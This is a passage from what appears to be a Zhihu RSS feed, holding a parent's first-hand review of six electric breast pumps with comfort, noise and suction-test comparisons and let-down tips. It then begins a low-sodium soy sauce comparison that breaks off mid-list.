电动吸奶器</b></h2>\n<p>电动吸奶器我总共购买了6款，分别为兰思诺、新贝、新安怡、美德乐丝韵翼、贝瑞克、美德乐心韵。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7885aa1cbca571958d138fb450809689_720w.jpg?rss\" data-rawwidth=\"794\" data-rawheight=\"203\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>测评价位从百元到万元不等，美德乐心韵由于其主机价格特别贵，因此选择租赁形式。</p>\n<p><b><u>电动吸奶器原理基本是相通的，都是通过先模拟宝宝吸吮节奏，刺激奶阵，然后开始收集乳汁</u></b>。它们的优势在于可以<b>兼顾效率和舒适</b>，尤其是双边电动吸奶器更是<b>大大节约妈妈们的排乳时间</b>。<b>它适合长期使用，也能兼顾外出、居家等不同的生活场景</b>。缺点是，不像手动吸奶器一样可以力度随心，无极调节。电动吸奶器的<b>力度都是“被设定的”</b>，<b>找到最适合自己的力度和产品，会需要一定的磨合和时间</b>。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-be47e863b9722dccb6f62e9c4c244040_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1231\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>在这几款电动吸奶器的测评中，美德乐心韵的体验特别棒！新贝以它超高性价比的表现，让我非常惊喜！</b>下面我分别写一下每款吸奶器的使用感受：</p>\n<h3><b>一、新贝8782吸奶器｜大黑马！</b></h3>\n<p>这款双边电动吸奶器是最令我惊喜的。<b>369元的价格，我本来没啥期待，但万万没想到是个大黑马！</b>它有专利双阀设计，主打双边变频吸乳。这个听概念一定没啥感觉，但当我在被各品牌吸奶器吸到麻木，奶阵一直爱来不来的时候。<b>它一阵别出心裁深深浅浅，轻轻重重地按摩袭来，让我奶阵立马就哗啦啦下来了</b>。当时，我就震惊了！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c0f97a0c814d7c2de66d4e49b2ce9f78_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>与市面上电动吸奶器普遍的按摩+吸吮2模式不同，新贝这款吸奶器有4个模式</b>。分别是：</p>\n<blockquote>泌乳模式：高频率刺激乳腺，高效实现喷乳反射；<br>变频模式：五轻一重循环刺激泌乳，提升奶阵几率；<br>吮吸模式：模拟宝宝吮吸频率，提升奶阵几率<br>吸乳模式：以缓和有力的节奏吸乳，实现快速排空。</blockquote>\n<p><b>这4种模式你可以简单理解为，前2种是按摩模式，哪个有感觉选哪个；后2种是吸奶模式，哪个舒服换哪个。</b>这种设计很好用。比如通常妈妈们的第二个奶阵会来得慢一点，被同一种按摩模式刺激太久也会减少泌乳的冲动。而这款的按摩模式就会多元一些，这项没感觉也没关系呀，换下一个！而且每个模式下都有9级档位，可以随时调到自己喜欢的感觉。冲着可以换“按摩手法”的设计，我就给它首推位了！</p>\n<p>另外<b>它还有一特别之处在可以两边交替吸乳。</b>一般情况下，双边吸奶器的操作模式是“左右同步收放”，这款吸奶器除兼顾前者外，还可以“左右左右”交替进行。我当时测评时觉得还挺舒服的。<b>由于吸吮方式多样，乳房得到充分的刺激，所以吸乳效率也高。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-8957dede549d8b9dd2a71004cc4ec7a9_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"交替吸乳，点开看！\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，取吸奶器最大档、最小档各吸1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-5a7ef8aa6ddb0e58f513a025db7ded45_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"左边最小吸力，右边最大吸力\" data-watermark=\"watermark\" data-original-src=\"v2-5a7ef8aa6ddb0e58f513a025db7ded45\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：共约40ml （家庭实验结果仅供参考）</i></p>\n<p>它很<b>便捷，清洗无死角</b>。产品还附赠了两个奶嘴，吸完奶直接就可以套上奶嘴给宝宝喝了！少洗一次奶瓶，贴心省力！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-14021ec98c9dd1b7fc5227b5272cfb85_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>新贝这款电动吸奶器<b><u>性价比真的完胜</u></b><u>！</u>但是它还是有缺点的。比如它的<b>1.镜面按键容易误触，或者接触不灵敏</b>。另外就是，虽然我觉得这款电动吸奶器不痛，但这是建立在我乳腺畅通，奶量稳定的基础上。<b>2.如果是需要开奶、尚在月子中泌乳不稳定、乳头皲裂，或者比我还疼痛敏感的妈妈，建议租美德乐心韵（后面会写，请继续往下看）。</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429721248146853888\"></a><p><b>它也是我测评后唯一留下来的一款。</b>（对，我甚至没留贝瑞克美德乐）</p>\n<h3><b>二、新安怡303电动吸奶器</b></h3>\n<p>我家也算是新安怡的老粉了，现在我宝宝嘴里就正嘬着新安怡的奶嘴~但这款吸奶器我体验下来觉得<b>无功无过</b>吧。<b>适合该品牌下忠诚度高的妈妈，不会让你失望，但也不会很出彩~</b></p>\n<p>它的安装比较便捷，清洗无死角。喇叭罩配备了花瓣气囊按摩，主动贴合乳房，可以缓解妈妈们吸奶过程中的不适。盒内赠送了两个奶嘴，吸完就可以直接套在奶瓶上给宝宝喝了，无需再倒出来喂哦，省心！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-77ef9092b1a6010636e20f341a460ee9_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>贴心的是，新安怡还附赠了一个收纳包，这样妈妈们外出就可以直接装在里面了，很方便！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ecb7cdf44ace535404cfdf340837aeb5_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>下面是缺点部分。首先<b>1.它这个吸奶器的设计有点上重下轻</b>，奶瓶立在桌子上很容易倾倒，当里面奶量不够多时需要非常小心地放平稳，不然奶洒漏出来好心疼。其次<b>2.对于疼痛敏感型妈妈，吸力算有点大</b>。即使只开了最低档，我测评了大概5分钟就不想继续了，因为觉得有点疼。<b>3.噪音在这几款当中是最大的</b>。 </p>\n<p><b>所以我只建议乳腺通畅，或者疼痛没那么敏感的妈妈买这款。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-339d00eb5020c08ebf65e8764b7e120b_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"539\" data-size=\"normal\" data-caption=\"低档吸力\" data-watermark=\"watermark\" data-original-src=\"v2-339d00eb5020c08ebf65e8764b7e120b\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>另外这款吸奶器在我实验时还出现了很奇怪的现象，不知是不是对贝亲奶瓶“不耐受”，竟然无论是最小档还是最大档位，都吸不出水。（但实际我亲测时，是能吸出奶的）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f572edd8857124152020af384420bcab_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"646\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f572edd8857124152020af384420bcab\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>所以此处没有实验结果。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429722254381363200\"></a><h3><b>三、兰思诺手电一体吸奶器</b></h3>\n<p>手动吸奶器的部分已经在前面写过，现在来写电动部分。它也是测评产品里面唯一一个单边电动吸奶器。<b>它适合追求小巧，预算有限，追求一机多用的妈妈。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-85f6e42aaf9c0ded22ef7e7c5dab6c6d_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它的特点在于主机真的非常小，个头比手机还小些，放在包里真是不占地方。另外一个亮点是自带安卓充电口，即使忘记带充电线了，随便找个充电宝就能续航了。就算连充电宝都没有，那就把配件换一下，改成手动吸奶器呗！厉害吧，这种设计还是很用心的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7e35e4ba4a454b3ad040bb3532079fdf_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"2666\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它的配件可以完全拆卸，清洁无死角。喇叭罩边缘采用的是TPE材质，手感类似硅胶，较传统的塑料边缘来说，柔软亲肤些。</p>\n<p>缺点也很明显，<b>1.最低档的吸力太大</b>，不适合疼痛敏感型妈妈，也不适合有开奶需求，或者乳腺淤堵的妈妈。这些群体妈妈用起来应该会比较痛。此外<b>2.它的噪音也不小</b>。<b>3.无屏幕显示时间</b>，使用起来不是很方便。不知道吸了多久，心里也没数。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-35b964f42f44097cdea5c1714eb6c396_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"低档吸力\" data-watermark=\"watermark\" data-original-src=\"v2-35b964f42f44097cdea5c1714eb6c396\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，取吸奶器最大档、最小档各吸1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic2.zhimg.com/v2-1368e9fc1acff1b88f8a0325adb0ff66_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1368e9fc1acff1b88f8a0325adb0ff66\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：共约40ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429722938093924352\"></a><h3><b>四、贝瑞克DS吸奶器｜多功能</b></h3>\n<p><b>贝瑞克DS吸奶器在所有测评产品里面，功能是最多的。</b>使用最低档按摩或吸奶时一点也不痛，适合疼痛敏感型妈妈。</p>\n<p><b>它有过人之处。其他吸奶器的吸力调节功能，只能双边同时调——即要么一起加，要么一起减。但贝瑞克是可以选择左边加，右边减，即左右按摩和排乳力度/频率完全自由</b>。比如有些妈妈有大小奶问题，或一边乳房受力，一边乳房不受力，那么这款吸奶器就可以为两边乳房选择不同的吸力和频率。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-566a1d00ebbf57b2e3e6d16544890237_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>除了按摩力度，吸奶力度分别可调外，贝瑞克DS吸奶器的按摩/吸奶节奏也可以调整。</b>有妈妈喜欢小力快节奏吸，有妈妈喜欢大力慢节奏吸，就有非常自由的调整空间。COOL！</p>\n<p>安装简单，配件可拆卸清洗无死角。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9f7e9e252a33fb44f9f88317d4186768_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它的缺点是<b>1.重且占地方</b>，只适合居家使用，不适合带出门。虽然<b>2.最低档吸奶不痛，但是吸奶效率就低了</b>。为了提高排乳效率，所以我会把吸力调高一点，找一个平衡值。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1be014dd8780bdf2386bec24edd40d31_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"低档吸力\" data-watermark=\"watermark\" data-original-src=\"v2-1be014dd8780bdf2386bec24edd40d31\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c0337f54b1ede5718757c198cb27f349_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c0337f54b1ede5718757c198cb27f349\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：共约60ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429723475393470465\"></a><h3><b>四、美德乐丝韵翼吸奶器｜便携</b></h3>\n<p>这款吸奶器在各平台上简直被吹爆啦！到这个价位了，体验感都不会太差了。<b>它确实也无痛，和贝瑞克DS体验感差不多。美德乐丝韵翼相对贝瑞克DS胜在更便携；贝瑞克DS胜在功能更灵活更丰富。</b>妈妈们可以结合自己的需要选择。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d91a128317bdde791e86e1c80888bfcf_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它的安装非常简单，拆卸下来也完全没有清洁死角。与其他品牌喇叭罩不一样的是，美德乐是椭圆形的，可以横放或竖放找不同的角度。它里面附赠了24mm和21mm两副不同尺寸的喇叭罩，无需另外购置，给妈妈们多一份选择空间。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-6f6cceadddea33a2d29a1782172924f1_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它也同样有缺点。比如<b>1.无屏幕，对于力度调节和时间都没有显示；2.在这个价位上功能不够丰富</b>；<b>3.略有噪音</b>，但在接受范围内。 </p>\n<p><img src=\"https://pic3.zhimg.com/v2-61ca6dab89f8c45dec6f2cd87f621048_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"低档吸力\" data-watermark=\"watermark\" data-original-src=\"v2-61ca6dab89f8c45dec6f2cd87f621048\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0cf0d0df99de3b0338d334c99fc1171f_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0cf0d0df99de3b0338d334c99fc1171f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：共约60ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429724339495612416\"></a><h3><b>五、美德乐心韵吸奶器｜疼痛敏感型妈妈必选</b></h3>\n<p>这台吸奶器我之前是没了解过的，在测评文章里看到知友们留言才开始关注。结果，<b><u>一测评就粉上头了</u>！</b>心韵是美德乐吸奶器里最高端的产品，属于医用级别了。只是它太太太贵了，所以我采用的是租赁方式，目前也是这台机器最主流的使用方式。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fa6a860272bf782b5619046dbf15276a_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>它非常非常适合月子里的妈妈！它的开奶模式我愿封之为神。心韵的开奶模式非常温和，真正是模仿新生儿的吮吸感。</b>我第一次测评时，是边在看综艺的，在我完全没管它的情况下，等我想起来再低头查看时，发现居然已经吸了100ml了！而我，完全没什么感觉！天哪~那一刻我实在是太震惊了！</p>\n<p><b>它无论是排空度还是舒适度，都比前面的普通家用吸奶器更好，而且没噪音。</b>安装和拆洗都非常简单，清洁无死角。最神奇的是，它的喇叭罩明明是普通的塑料，也没搞硅胶圈，按摩垫什么的，但这圈小塑料就是无比的贴合，无比的巴适，咋回事呢？她舒适到让我在写这款测评时，都觉得自己像托。</p>\n<p><b>月子里、特别怕痛的或者想提升奶量的妈妈特别适合这款。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4c700d7669b949b085dbc30cb8795548_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它的缺点是，<b>1.太大太重了，拎着它跟块铁坨似的</b>。只能放在家里定点使用。<b>2.没有暂停键</b>，比如你想从开奶模式调到正常模式，就得关机重来，再走一遍程序。<b>3.屏幕不显示时间，且没有背光灯</b>，晚上不开灯啥也看不见。<b>4.和美德乐吸奶器其他配件不通用</b>，租这个的话还能重新再购买配件。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-338f7f4633c170f0d8434b5c15af0954_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"开奶模式\" data-watermark=\"watermark\" data-original-src=\"v2-338f7f4633c170f0d8434b5c15af0954\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-db12e4fe4c9cfb6966673e1bbc9a617c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-db12e4fe4c9cfb6966673e1bbc9a617c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：共约80ml （家庭实验结果仅供参考）</i></p>\n<p>妈妈们可以选择租回来试一下，后面再根据情况决定续租或者退回去都可以。我当时选的那家可以<b>7天试租</b>99元，一般租金650元/月，3个月以上550元/月。虽然我测评只用了7天，但当时我都想留着续租了，它以一己之力向我证明了：本人真的有奶！本人奶真的够！</p>\n<p><b>总而言之，好用！租它！</b></p>\n<p><i>（如果你连用心韵都痛，那就啥品牌吸奶器都别买了。请个专业的母乳指导上门先了解情况吧。）</i></p>\n<hr>\n<h2>附言</h2>\n<p><b><i>以上所有被测评的吸奶器都没有回流问题。</i></b></p>\n<p>写到这里，我想多说一句。<b>吸奶器和其他产品测评不一样的地方在：它很难隔空给出一个完全适合你的建议。</b>因为每个人的乳房条件都不一样，可能A妈妈觉得不痛的，B妈妈却觉得很痛。有的时候看到一些测评说XX产品超级不痛，你跟风买了发现“痛死我了”，其实并不一定是对方收了黑心广告钱，而是你跟对方的乳房条件不一样，可能她乳汁多，几分钟就吸完收工了，当然没啥痛咯；也可能她对疼痛并不敏感啊等等。所以本篇我同时用了比如吸奶瓶，吸气球展示等比较客观的展示方法。</p>\n<p><b>而且哦，吸力并不是越大越好。妈妈自我感觉最舒适的力度才可能分泌出最充沛的乳汁。</b>我一胎时不懂使用吸奶器，在奶水不够的情况下，每次都心急地开启大力吸奶模式，误以为力气越大吸出的奶越多。殊不知持续大力吸很容易把乳头吸伤，我自己越痛，奶阵越难以到来，于是耗在吸奶器上的时间也越多，形成恶性循环。最后乳头红肿皲裂，奶水也下不来，两败俱伤。<b>新手妈妈们请一定记住，在妈妈身心愉悦的状态下，奶阵才容易发生。</b></p>\n<p><b>为什么我如此强调奶阵呢？因为借助奶阵可以让你的吸奶效率大大提升。</b>试想一下你被吸奶器从乳房中一滴一滴拔出奶的感觉 VS 吸奶器一吸奶水就噗噗噗往外流。显然后者会让你轻松很多呀！这样一来，乳头被吸奶器拉扯的时间就少，乳房也能得到更好的休息，为下一次产奶蓄力。所以，选定一台适合自己的吸奶器很重要哦！</p>\n<h3>这里我再给大家提供一些刺激奶阵的小妙招：</h3>\n<p>1.吸奶前选择一个相对安静的房间，避开打扰，放松身心。</p>\n<p>2.喝一杯温开水。乳汁的大部分都是水，喝水不仅能补充身体水分，也能提醒我们的身体，准备吸奶了。</p>\n<p>3.如果有条件的话，可以热敷一下乳房。</p>\n<p>4.按摩你的乳房。可以轻轻触动乳头表面，轻而快地按压乳头；也可以用大拇指和食指握住乳头根部，往乳晕方向轻压；或者用手托住乳房，轻微抖动。哪种按摩方式最令你舒适，就采用哪种即可。</p>\n<p>5.当坐下来吸奶时，可以看看宝宝的视频，或者闻闻宝宝的味道，甚至录一段宝宝的哭声，这些小细节都有可能帮助妈妈们很快刺激出奶阵。</p>\n<p>以上，希望对大家有用。</p>\n<p>附：吸奶器总对比图</p>\n<p><img src=\"https://pic1.zhimg.com/v2-082ce73e13830d70bbcca157a2d02d4e_720w.jpg?rss\" data-rawwidth=\"852\" data-rawheight=\"479\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>最后，谢谢你看到这里。我是 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/0ba3b5679cf13f66a8c6c551a7b04437\" data-hash=\"0ba3b5679cf13f66a8c6c551a7b04437\" data-hovercard=\"p$b$0ba3b5679cf13f66a8c6c551a7b04437\">@YUNYA麻麻</a>，一直对母婴领域用品保持着谨慎、理智的消费态度。如果你认为我还算值得信赖，欢迎点赞和关注哦！</p>\n<hr>\n<blockquote>我是 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/0ba3b5679cf13f66a8c6c551a7b04437\" data-hash=\"0ba3b5679cf13f66a8c6c551a7b04437\" data-hovercard=\"p$b$0ba3b5679cf13f66a8c6c551a7b04437\">@YUNYA麻麻</a> ，家有二胎的500强企业妈妈，2020年度新知答主，母婴盐究员，儿童教育优秀回答者。</blockquote>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yunyama-ma?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">YUNYA麻麻</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/348359318/answer/2159479799?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">230 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/485784624?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">母乳喂养的妈妈有没有必要买电动吸奶器？有没有200以内值得买的推荐？</a><br><a href=\"http://www.zhihu.com/question/458174777?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">母乳喂养只吃一侧，另一侧该不该用吸奶器?</a><br>\n","link":"http://www.zhihu.com/question/348359318/answer/2159479799?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国产酱油有哪些值得推荐?","date":"2021-10-08 06:28:58","description":"\n<p>非常高兴收到 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/9f4fb22e0686450a11c6d5dc122e4888\" data-hash=\"9f4fb22e0686450a11c6d5dc122e4888\" data-hovercard=\"p$b$9f4fb22e0686450a11c6d5dc122e4888\">@知乎生活</a> 的邀请，成为翻牌众测活动的「翻牌」嘉宾！那就开始吧~</p>\n<p>首先我们要知道，我们使用酱油的目的是提鲜，而不仅仅是增加咸味。所以，好的酱油可以让你提鲜的同时，减少钠的摄入。 </p>\n<p><b>那酱油中「鲜味」来自于哪里呢？</b> </p>\n<p>酱油中鲜味的来源主要是大豆和小麦在酿造过程中，蛋白质水解产生的氨基酸。我们一般用【氨基酸态氮含量】这个指标来衡量酱油的鲜味。它也是衡量一款酱油质量等级的指标。</p>\n<p>根据国标，氨基酸态氮含量≥0.8g的为特级酱油，≥0.7g是一级酱油，≥0.55g是二级酱油，≥0.4g是三级酱油。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3c9d16c4a4aef8ce58c693e25c7945f1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"535\" data-rawheight=\"132\" data-watermark=\"watermark\" data-original-src=\"v2-3c9d16c4a4aef8ce58c693e25c7945f1\" data-watermark-src=\"v2-cc809e0c4895484c08c3414fcb043641\" data-private-watermark-src=\"v2-fa12c3e47bf92cec618bebfae2316c68\"></p>\n<p>也就是说，【氨基酸态氮含量】越高，酱油会越鲜，酱油的品质相对也越高。但这可以代表是一款好的酱油了吗？</p>\n<p>我认为还不够。尤其是现在我们越来越关注饮食的健康，对「减盐酱油」「儿童酱油」的追求，也成了我们选择酱油的一种新需求。所以我这次买了32款市面上常见的酱油，想具体尝一尝，看一看，有没有真正减盐的好酱油？</p>\n<p><b>（内容有点长，晚点会持续更新下图片和视频！）</b></p>\n<h2> 一、纳入横评的减盐酱油品牌</h2>\n<p>这次所有评测的产品几乎均通过京东自营、天猫旗舰店和盒马渠道购入。一共买了19个品牌的32款产品。由于其中有3个品牌的4款产品并非酿造酱油，属于调味汁。所以主要对16个品牌的28款减盐酱油做了横向评测。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-094e38c8498e7be481c4ca73ac6f3ee4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"369\" data-watermark=\"watermark\" data-original-src=\"v2-094e38c8498e7be481c4ca73ac6f3ee4\" data-watermark-src=\"v2-fac61625ab271db0549a420f62927b30\" data-private-watermark-src=\"v2-16ce039e27a496a007832cb0c91b3881\"></p>\n<h3>01 传统品牌：10个品牌24款产品</h3>\n<ul>\n<li>l 李锦记：有4款产品，全部定位「减盐」。</li>\n<li>l 海天：有4款产品。其中3款定位「减盐」，1款定位「儿童」。</li>\n<li>l 欣和，有6款产品。其中4款六月鲜产品定位「减盐」，2款禾然有机产品定位「儿童」。</li>\n<li>l 玉兔，有3款产品。其中信芳园古方原酿定位「减盐」，秋田满满和应物喜饭定位「儿童」。</li>\n<li>l 加加，有2款减盐产品，各有1款定位「减盐」和「儿童」市场。</li>\n<li>l 万字，有1款减盐产品。但是区别于日本万字，本次纳入的是国产万字。</li>\n<li>l 此外东古、珠江桥牌、味事达、厨邦各有1款减盐产品，均定位传统减盐市场。</li>\n</ul>\n<h3>02 新兴品牌：2个品牌2款产品，定位儿童市场</h3>\n<ul>\n<li>l 小鹿蓝蓝：虽然是新兴品牌，但其实是山东淄博玉兔代工的。</li>\n<li>l 爷爷的农场：同样是代工生产，代工厂是山东烟台食圣。山东食圣还为多个互联网品牌代工生产，清一色的为贴牌产品。</li>\n</ul>\n<p><img src=\"https://pic4.zhimg.com/v2-a2fd2b5cf972f0ecc0c14df034bb482b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"415\" data-watermark=\"watermark\" data-original-src=\"v2-a2fd2b5cf972f0ecc0c14df034bb482b\" data-watermark-src=\"v2-a64bd4a0364f436911c31c64717f6a32\" data-private-watermark-src=\"v2-6535a681b810f3174c51c08aaac8c3ed\"></p>\n<h3>03 进口品牌：1个品牌2款产品</h3>\n<ul><li>l 禾泱泱：中国台湾进口产品，特色是365天足酿，有黑豆和昆布两款产品，定位儿童市场。在妈妈群体中的呼声很高，我和钱爸周围就有好几个朋友在用这个牌子的酱油。</li></ul>\n<p><img src=\"https://pic2.zhimg.com/v2-22484e75874b44e9edfe4dc0e0fa61fb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"553\" data-rawheight=\"415\" data-watermark=\"watermark\" data-original-src=\"v2-22484e75874b44e9edfe4dc0e0fa61fb\" data-watermark-src=\"v2-03f68c158a412c7f3b92d0fbaac3e90b\" data-private-watermark-src=\"v2-886d93b85efc0389d4747bd582d6aa26\"></p>\n<h3>04 4款减盐调味汁产品</h3>\n<ul>\n<li>\n<b>l 雀巢美极</b>：宣传是减盐，但并非酿造酱油，属于调味汁。亮点在于配料里没有大豆，对大豆过敏的人可以选择这款调味汁替代酱油使用。口感上美极有点类似于宴会酱油的感觉，鲜甜为主，沾白煮蛋应该是绝配。</li>\n<li>\n<b>l 